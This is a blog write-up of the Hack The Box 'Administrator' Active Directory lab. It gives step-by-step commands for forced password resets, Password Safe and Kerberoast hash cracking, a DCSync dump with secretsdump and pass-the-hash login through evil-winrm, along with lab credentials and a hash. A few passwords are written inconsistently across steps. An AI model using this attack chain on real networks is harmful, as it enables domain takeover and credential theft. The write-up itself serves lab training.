<!doctype html><!-- This site was created with Hugo Blox. https://hugoblox.com --><!-- Last Published: May 11, 2025 --><html lang=en-us dir=ltr data-wc-theme-default=system><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Hugo Blox Builder 0.3.1"><meta name=author content="0xSECLAB"><meta name=description content="An Active Directory box based on modern penetration testing"><link rel=alternate hreflang=en-us href=http://localhost:1313/blog/administrator-htb/><link rel=stylesheet href=/css/themes/blue.min.css><link href=/dist/wc.min.css rel=stylesheet><script>window.hbb={defaultTheme:document.documentElement.dataset.wcThemeDefault,setDarkTheme:()=>{document.documentElement.classList.add("dark"),document.documentElement.style.colorScheme="dark"},setLightTheme:()=>{document.documentElement.classList.remove("dark"),document.documentElement.style.colorScheme="light"}},console.debug(`Default Hugo Blox Builder theme is ${window.hbb.defaultTheme}`),"wc-color-theme"in localStorage?localStorage.getItem("wc-color-theme")==="dark"?window.hbb.setDarkTheme():window.hbb.setLightTheme():(window.hbb.defaultTheme==="dark"?window.hbb.setDarkTheme():window.hbb.setLightTheme(),window.hbb.defaultTheme==="system"&&(window.matchMedia("(prefers-color-scheme: dark)").matches?window.hbb.setDarkTheme():window.hbb.setLightTheme()))</script><script>document.addEventListener("DOMContentLoaded",function(){let e=document.querySelectorAll("li input[type='checkbox'][disabled]");e.forEach(e=>{e.parentElement.parentElement.classList.add("task-list")});const t=document.querySelectorAll(".task-list li");t.forEach(e=>{let t=Array.from(e.childNodes).filter(e=>e.nodeType===3&&e.textContent.trim().length>1);if(t.length>0){const n=document.createElement("label");t[0].after(n),n.appendChild(e.querySelector("input[type='checkbox']")),n.appendChild(t[0])}})})</script><link rel=icon type=image/png href=/media/icon_hu8996567459941497553.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu10166371720792423244.png><link rel=canonical href=http://localhost:1313/blog/administrator-htb/><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@GetResearchDev"><meta property="twitter:creator" content="@GetResearchDev"><meta property="og:site_name" content="0xseclab"><meta property="og:url" content="http://localhost:1313/blog/administrator-htb/"><meta property="og:title" content="Administrator | 0xseclab"><meta property="og:description" content="An Active Directory box based on modern penetration testing"><meta property="og:image" content="http://localhost:1313/blog/administrator-htb/featured.png"><meta property="twitter:image" content="http://localhost:1313/blog/administrator-htb/featured.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2025-05-05T00:00:00+00:00"><meta property="article:modified_time" content="2025-05-05T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/administrator-htb/"},"headline":"Administrator","image":["http://localhost:1313/blog/administrator-htb/featured.png"],"datePublished":"2025-05-05T00:00:00Z","dateModified":"2025-05-05T00:00:00Z","author":{"@type":"Person","name":"0xseclab"},"publisher":{"@type":"Organization","name":"0xseclab","logo":{"@type":"ImageObject","url":"http://localhost:1313/media/icon_hu6768892225974157571.png"}},"description":"An Active Directory box based on modern penetration testing"}</script><title>Administrator | 0xseclab</title><style>@font-face{font-family:inter var;font-style:normal;font-weight:100 900;font-display:swap;src:url(/dist/font/Inter.var.woff2)format(woff2)}</style><link type=text/css rel=stylesheet href=/dist/pagefind/pagefind-ui.be766eb419317a14ec769d216e9779bfe8f3737c80e780f4ba0dafb57a41a482.css integrity="sha256-vnZutBkxehTsdp0hbpd5v+jzc3yA54D0ug2vtXpBpII="><script src=/dist/pagefind/pagefind-ui.87693d7c6f2b3b347ce359d0ede762c033419f0a32b22ce508c335a81d841f1b.js integrity="sha256-h2k9fG8rOzR841nQ7ediwDNBnwoysizlCMM1qB2EHxs="></script><script>window.hbb.pagefind={baseUrl:"/"}</script><style>html.dark{--pagefind-ui-primary:#eeeeee;--pagefind-ui-text:#eeeeee;--pagefind-ui-background:#152028;--pagefind-ui-border:#152028;--pagefind-ui-tag:#152028}</style><script>window.addEventListener("DOMContentLoaded",e=>{new PagefindUI({element:"#search",showSubResults:!0,baseUrl:window.hbb.pagefind.baseUrl,bundlePath:window.hbb.pagefind.baseUrl+"pagefind/"})}),document.addEventListener("DOMContentLoaded",()=>{let e=document.getElementById("search"),t=document.getElementById("search_toggle");t&&t.addEventListener("click",()=>{if(e.classList.toggle("hidden"),e.querySelector("input").value="",e.querySelector("input").focus(),!e.classList.contains("hidden")){let t=document.querySelector(".pagefind-ui__search-clear");t&&!t.hasAttribute("listenerOnClick")&&(t.setAttribute("listenerOnClick","true"),t.addEventListener("click",()=>{e.classList.toggle("hidden")}))}})})</script><script defer src=/js/hugo-blox-en.min.js integrity></script></head><body class="dark:bg-hb-dark dark:text-white page-wrapper" id=top><div id=page-bg></div><div class=page-header><header id=site-header class=header><nav class="navbar px-3 flex justify-left"><div class="order-0 h-100"><a class=navbar-brand href=/ title=0xseclab></a></div><input id=nav-toggle type=checkbox class=hidden>
<label for=nav-toggle class="order-3 cursor-pointer flex items-center lg:hidden text-dark dark:text-white lg:order-1"><svg id="show-button" class="h-6 fill-current block" viewBox="0 0 20 20"><title>Open Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0V0z"/></svg><svg id="hide-button" class="h-6 fill-current hidden" viewBox="0 0 20 20"><title>Close Menu</title><polygon points="11 9 22 9 22 11 11 11 11 22 9 22 9 11 -2 11 -2 9 9 9 9 -2 11 -2" transform="rotate(45 10 10)"/></svg></label><ul id=nav-menu class="navbar-nav order-3 hidden lg:flex w-full pb-6 lg:order-1 lg:w-auto lg:space-x-2 lg:pb-0 xl:space-x-8 justify-left"><li class=nav-item><a class=nav-link href=/>Home</a></li><li class=nav-item><a class=nav-link href=/tags/>Topics</a></li><li class=nav-item><a class=nav-link href=/about/>About</a></li></ul><div class="order-1 ml-auto flex items-center md:order-2 lg:ml-0"><button aria-label=search class="text-black hover:text-primary inline-block px-3 text-xl dark:text-white" id=search_toggle><svg height="16" width="16" viewBox="0 0 512 512" fill="currentcolor"><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8.0 45.3s-32.8 12.5-45.3.0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9.0 208S93.1.0 208 0 416 93.1 416 208zM208 352a144 144 0 100-288 144 144 0 100 288z"/></svg></button><div class="px-3 text-black hover:text-primary-700 dark:text-white dark:hover:text-primary-300
[&.active]:font-bold [&.active]:text-black/90 dark:[&.active]:text-white"><button class="theme-toggle mt-1" accesskey=t title=appearance><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="dark:hidden"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="dark:block [&:not(dark)]:hidden"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div></nav></header><div id=search class="hidden p-3"></div></div><div class="page-body my-10"><div class="mx-auto flex max-w-screen-xl"><aside class="hb-sidebar-container max-lg:[transform:translate3d(0,-100%,0)] lg:hidden xl:block"><div class="px-4 pt-4 lg:hidden"></div><div class="hb-scrollbar lg:h-[calc(100vh-var(--navbar-height))]"><ul class="flex flex-col gap-1 lg:hidden"><li class=open><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/>Blog
<span data-hb-sidebar-toggle><svg fill="none" viewBox="0 0 24 24" stroke="currentcolor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"/></svg></span></a><div class="ltr:pr-0 overflow-hidden"><ul class=hb-sidebar-list><li class="flex flex-col"><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/vintage-htb/>Vintage</a></li><li class="flex flex-col open"><a class="hb-sidebar-custom-link
sidebar-active-item bg-primary-100 font-semibold text-primary-800 dark:bg-primary-300 dark:text-primary-900" href=/blog/administrator-htb/>Administrator</a><ul class=hb-sidebar-mobile-toc><li><a href=#1-nmap-scan class=hb-docs-link>1. NMAP-SCAN:</a></li><li><a href=#2-bloodhound class=hb-docs-link>2. BLOODHOUND:</a></li><li><a href=#3-rpclientnet-rpc class=hb-docs-link>3. RPCLIENT/NET RPC:</a></li><li><a href=#3-ftp-as-benjamin class=hb-docs-link>3. FTP AS BENJAMIN:</a></li><li><a href=#4-cracking-the-pwsafe-file class=hb-docs-link>4. CRACKING THE PWSAFE FILE:</a></li><li><a href=#5-access-backuppsafe3-via-pwsafe class=hb-docs-link>5. ACCESS BACKUP.PSAFE3 VIA PWSAFE:</a></li><li><a href=#5-bloodhound-again class=hb-docs-link>5. BLOODHOUND AGAIN:</a></li><li><a href=#6-ntpupdate class=hb-docs-link>6. NTPUPDATE:</a></li><li><a href=#7-attacking-via-targetedkerberoastpy class=hb-docs-link>7. ATTACKING VIA TARGETEDKERBEROAST.PY:</a></li><li><a href=#8-cracking-the-hash-of-ethan class=hb-docs-link>8. CRACKING THE HASH OF ETHAN:</a></li><li><a href=#9-dumping-the-sam-via-secretsdump-dcsync class=hb-docs-link>9. DUMPING THE SAM VIA SECRETSDUMP (DCSync):</a></li><li><a href=#10-evil-winrm-as-administrator class=hb-docs-link>10. EVIL WINRM AS ADMINISTRATOR:</a></li></ul></li></ul></div></li><li><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/about/>About Me</a></li></ul><div class="max-xl:hidden h-0 w-64 shrink-0"></div></div></aside><nav class="hb-toc order-last hidden w-64 shrink-0 xl:block print:hidden px-4" aria-label="table of contents"><div class="hb-scrollbar text-sm [hyphens:auto] sticky top-16 overflow-y-auto pr-4 pt-6 max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] -mr-4 rtl:-ml-4"><p class="mb-4 font-semibold tracking-tight">On this page</p><ul><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#1-nmap-scan>1. NMAP-SCAN:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#2-bloodhound>2. BLOODHOUND:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#3-rpclientnet-rpc>3. RPCLIENT/NET RPC:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#3-ftp-as-benjamin>3. FTP AS BENJAMIN:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#4-cracking-the-pwsafe-file>4. CRACKING THE PWSAFE FILE:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#5-access-backuppsafe3-via-pwsafe>5. ACCESS BACKUP.PSAFE3 VIA PWSAFE:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-12 rtl:pr-12 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#we-got-3-users-with-there-passwords-time-to-again-check-bloodhound-for-the-high-target-user>We got 3 users with there passwords. Time to again check bloodhound for the High Target User</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#5-bloodhound-again>5. BLOODHOUND AGAIN:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#question--1-what-is-genericwrite-access-means->QUESTION # 1: WHAT IS GENERICWRITE ACCESS MEANS ?</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#question--2-how-to-abuse-it->QUESTION # 2: HOW TO ABUSE IT ?</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#6-ntpupdate>6. NTPUPDATE:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-12 rtl:pr-12 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#via-smbclient>VIA SMBCLIENT:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#7-attacking-via-targetedkerberoastpy>7. ATTACKING VIA TARGETEDKERBEROAST.PY:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-12 rtl:pr-12 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#switching-back-to-your-local-time->SWITCHING BACK TO YOUR LOCAL TIME :</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#8-cracking-the-hash-of-ethan>8. CRACKING THE HASH OF ETHAN:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-12 rtl:pr-12 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#bloodhound>BLOODHOUND:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#9-dumping-the-sam-via-secretsdump-dcsync>9. DUMPING THE SAM VIA SECRETSDUMP (DCSync):</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="font-semibold inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#10-evil-winrm-as-administrator>10. EVIL WINRM AS ADMINISTRATOR:</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#alhamdulillah>ALHAMDULILLAH</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-12 rtl:pr-12 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#rooted>#ROOTED</a></li></ul><div class="mt-8 border-t dark:border-neutral-700 pt-8 sticky bottom-0 flex flex-col items-start gap-2 pb-8"><a class="text-xs font-medium text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-100 contrast-more:text-gray-800 contrast-more:dark:text-gray-50" href=https://github.com/HugoBlox/hugo-blox-builder/edit/main/starters/blog/content/blog/administrator-htb/index.md target=_blank rel=noreferer>Edit this page</a></div>
    
    
  </div></nav><article class="w-full break-words flex min-h-[calc(100vh-var(--navbar-height))] min-w-0 justify-center pb-8 pr-[calc(env(safe-area-inset-right)-1.5rem)]"><main class="w-full min-w-0 max-w-6xl px-6 pt-4 md:px-12"><h1 class="mt-2 text-4xl font-bold tracking-tight text-slate-900 dark:text-slate-100">Administrator</h1><div class="mt-4 mb-16"><div class="text-gray-500 dark:text-gray-300 text-sm flex items-center flex-wrap gap-y-2"><span class=mr-1>May 5, 2025</span><span class=mx-1>·</span><div class="group inline-flex items-center text-current gap-x-1.5 mx-1"><div>0xseclab</div></div><span class=mx-1>·</span>
<span class=mx-1>3 min read</span></div><div class=mt-3></div></div><div class="article-header article-container featured-image-wrapper mt-4 mb-16" style=max-width:300px;max-height:300px><div style=position:relative><img src=/blog/administrator-htb/featured_hu16080958612567697902.webp width=300 height=300 alt class=featured-image></div></div><div class="prose prose-slate lg:prose-xl dark:prose-invert"><div style=text-align:center;font-size:2em;font-weight:700;color:#00fa9a>ADMINISTRATOR-HTB-ACTIVE DIRECTORY</div><h2 id=1-nmap-scan>1. NMAP-SCAN:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -p- -sV -sC --open -oN nmap-administrator Target-IP
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img alt srcset="/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp 400w,
/blog/administrator-htb/1-Administrator_hu17992487573682762244.webp 760w,
/blog/administrator-htb/1-Administrator_hu3923997780253804761.webp 1200w" src=/blog/administrator-htb/1-Administrator_hu1989788176023874794.webp width=760 height=500 loading=lazy data-zoomable></div></div></figure></p><p>Since initial access was given as :-
<em>Username:</em> <strong>Olivia</strong>
<em>Password:</em> <strong>ichliebedich</strong></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image.png alt loading=lazy data-zoomable></div></div></figure></p><h2 id=2-bloodhound>2. BLOODHOUND:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo bloodhound-python -u <span class=s2>&#34;olivia&#34;</span> -p <span class=s2>&#34;ichliebedich&#34;</span> -d administrator.htb -c all --zip -ns 10.10.11.42
</span></span></code></pre></div><p><strong>Check Olivia&rsquo;s Outbound Object Control:</strong></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-1.png alt loading=lazy data-zoomable></div></div></figure></p><p>It can be seen that the user olivia has GenericAll over Michael. Means we can change the password of Michael as Olivia.</p><h2 id=3-rpclientnet-rpc>3. RPCLIENT/NET RPC:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rpcclient -N  10.10.11.42 -U administrator.htb/<span class=s1>&#39;olivia%ichliebedich&#39;</span>
</span></span><span class=line><span class=cl>setuserinfo michael <span class=m>23</span> Password123
</span></span></code></pre></div><div style=text-align:center;font-size:1.5em;font-weight:700;color:Golden>OR</div><p>We could:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>net rpc password michael Password123 -U administrator.htb/<span class=s1>&#39;olivia%ichliebedich&#39;</span> -S administrator.htb
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-2.png alt loading=lazy data-zoomable></div></div></figure></p><p>This time checking Michael Outbound Object Controls:</p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-3.png alt loading=lazy data-zoomable></div></div></figure></p><p>It can be seen that the user Michael has <strong>ForceChangePassword</strong> over Benjamin. Means we can change the password of Michael as Benjamin.</p><p>Time to change Benjamin password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>net rpc password benjamin Password123 -U administrator.htb/michael%Password123 -S administrator.htb
</span></span></code></pre></div><p>Although we changed the password of Benjamin but we cant access Benjamin as Evil-Winrm since he doesn’t have a winrm access. Moreove, wmiexec and psexec also didn’t worked.</p><h2 id=3-ftp-as-benjamin>3. FTP AS BENJAMIN:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>lftp -u administrator.htb<span class=se>\\</span>benjamin,Password123! 10.10.11.42
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-5.png alt loading=lazy data-zoomable></div></div></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl>get Backup.psafe3
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-6.png alt loading=lazy data-zoomable></div></div></figure></p><blockquote><p>The file is pwsafe format so for that we need to first change it into .txt via pwsafe2john then crack it via john</p></blockquote><h2 id=4-cracking-the-pwsafe-file>4. CRACKING THE PWSAFE FILE:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwsafe2john Backup.psafe3 &gt; pwhash.txt
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-7.png alt loading=lazy data-zoomable></div></div></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john --format<span class=o>=</span>pwsafe pwhash.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-8.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-9.png alt loading=lazy data-zoomable></div></div></figure></p><p>PASSWORD FOR BACKUP FILE: <strong>tekieromucho</strong></p><h2 id=5-access-backuppsafe3-via-pwsafe>5. ACCESS BACKUP.PSAFE3 VIA PWSAFE:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install passwordsafe
</span></span><span class=line><span class=cl>pwsafe Backup.psafe3
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-10.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-11.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-12.png alt loading=lazy data-zoomable></div></div></figure></p><h5 id=we-got-3-users-with-there-passwords-time-to-again-check-bloodhound-for-the-high-target-user>We got 3 users with there passwords. Time to again check bloodhound for the High Target User</h5><h2 id=5-bloodhound-again>5. BLOODHOUND AGAIN:</h2><ul><li>Check Emily</li><li>Outbound Object Control</li></ul><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-13.png alt loading=lazy data-zoomable></div></div></figure></p><blockquote><p>Emily has GenericWrite Access over Ethan</p></blockquote><blockquote><p>Ethan is a High Value Target</p></blockquote><p>Lets Check the Analysis Tab.</p><ul><li>Find Shortest Path to Domain Admins</li></ul><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-14.png alt loading=lazy data-zoomable></div></div></figure></p><h4 id=question--1-what-is-genericwrite-access-means->QUESTION # 1: WHAT IS <em>GENERICWRITE ACCESS</em> MEANS ?</h4><p><code>Permission that allows a subject (user, process, or application) to perform write operations (modify, create, delete) on a resource (file, database, object, etc.) without specific restrictions.</code></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-15.png alt loading=lazy data-zoomable></div></div></figure></p><h4 id=question--2-how-to-abuse-it->QUESTION # 2: HOW TO ABUSE IT ?</h4><p>We have some options for it.</p><ol><li><strong>Shadow Credentials</strong></li><li><strong>TargetedKerberoast</strong></li></ol><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-16.png alt loading=lazy data-zoomable></div></div></figure></p><p>We are using the 2nd option which is targetedKerberoast.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ./targetedKerberoast.py -v -d <span class=s1>&#39;administrator.htb&#39;</span> -u <span class=s1>&#39;EMILY&#39;</span> -p <span class=s1>&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span> --dc-ip 10.10.11.42
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-17.png alt loading=lazy data-zoomable></div></div></figure></p><p><em>FOR KERBEROAST TO WORK WE NEED TO HAVE THE SAME DATE AND TIME AS OF THE TARGET. FOR THAT WE CAN USE NTPUPDATE OR MANUALLY CHANGE TIME VIA SMBCLIENT WITH ACCESS</em></p><h2 id=6-ntpupdate>6. NTPUPDATE:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo apt install ntpdate -y
</span></span><span class=line><span class=cl>sudo mousepad /etc/ntp.conf
</span></span></code></pre></div><p><code>server 10.10.11.42</code></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-18.png alt loading=lazy data-zoomable></div></div></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ntpdate 10.10.11.42
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-19.png alt loading=lazy data-zoomable></div></div></figure></p><div style=text-align:center;font-size:1.5em;font-weight:700;color:Golden>OR</div><h5 id=via-smbclient>VIA SMBCLIENT:</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>smbclient -L 10.10.11.42 -U <span class=s1>&#39;EMILY%UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
</span></span></code></pre></div><p><strong>Manually set your system time:</strong> Once you know the DC&rsquo;s time, manually set your machine&rsquo;s time using:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo date -s <span class=s2>&#34;YYYY-MM-DD HH:MM:SS&#34;</span>
</span></span></code></pre></div><h2 id=7-attacking-via-targetedkerberoastpy>7. ATTACKING VIA TARGETEDKERBEROAST.PY:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ./targetedKerberoast.py -v -d <span class=s1>&#39;administrator.htb&#39;</span> -u <span class=s1>&#39;EMILY&#39;</span> -p <span class=s1>&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span> --dc-ip 10.10.11.42
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-20.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-21.png alt loading=lazy data-zoomable></div></div></figure></p><h5 id=switching-back-to-your-local-time->SWITCHING BACK TO YOUR LOCAL TIME :</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ntpdate pool.ntp.org
</span></span><span class=line><span class=cl>timedatectl status
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-22.png alt loading=lazy data-zoomable></div></div></figure></p><h2 id=8-cracking-the-hash-of-ethan>8. CRACKING THE HASH OF ETHAN:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -m <span class=m>13100</span> ethan.hash /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-23.png alt loading=lazy data-zoomable></div></div></figure></p><p>Username: <em>ethan</em><br>Password: <strong>limpbizket</strong></p><p>Again, we tried evil winrm as ethan but no access.</p><p>Time to check Ethan privileges.</p><h5 id=bloodhound>BLOODHOUND:</h5><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-24.png alt loading=lazy data-zoomable></div></div></figure></p><p>We can see that the user ethan has <strong>DCSync</strong> Write over the DC. Hence we can dump its <strong>sam</strong> <em>impacket-secretsdump.py</em></p><h2 id=9-dumping-the-sam-via-secretsdump-dcsync>9. DUMPING THE SAM VIA SECRETSDUMP (DCSync):</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo impacket-secretsdump <span class=s1>&#39;administrator.htb/ethan:limpbizkit@10.10.11.42&#39;</span>
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-25.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-26.png alt loading=lazy data-zoomable></div></div></figure></p><h2 id=10-evil-winrm-as-administrator>10. EVIL WINRM AS ADMINISTRATOR:</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i 10.10.11.42 -u <span class=s1>&#39;administrator&#39;</span> -H <span class=s1>&#39;3dc553ce4b9fd20bd016e098d2d2fd2e&#39;</span>
</span></span></code></pre></div><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-30.png alt loading=lazy data-zoomable></div></div></figure></p><p><figure><div class="flex justify-center"><div class=w-100><img src=./image-31.png alt loading=lazy data-zoomable></div></div></figure></p><h3 id=alhamdulillah>ALHAMDULILLAH</h3><h5 id=rooted>#ROOTED</h5></div><time class="mt-12 mb-8 block text-xs text-gray-500 ltr:text-right rtl:text-left dark:text-gray-400" datetime=2025-05-05T00:00:00.000Z><span>Last updated on</span>
